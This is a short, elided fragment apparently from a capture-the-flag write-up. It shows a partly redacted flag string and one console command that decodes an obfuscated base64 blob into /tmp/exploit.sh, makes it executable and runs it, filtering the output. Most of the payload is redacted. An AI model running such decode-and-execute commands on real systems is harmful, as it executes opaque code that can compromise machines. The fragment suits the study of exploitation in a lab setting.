...
FLAG{[AWS_SECRET_REMOVED]dEveryth1ng}
```
...
```console
echo [AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]YWciICIvdG1wL2ZvcnR1bmUiCmRvbmU= | base64 -d > /tmp/exploit.sh && chmod +x /tmp/exploit.sh && /tmp/exploit.sh 2>&1 | grep -v Quitting | grep -v null | grep -v uninitialized | grep -v "No such file"
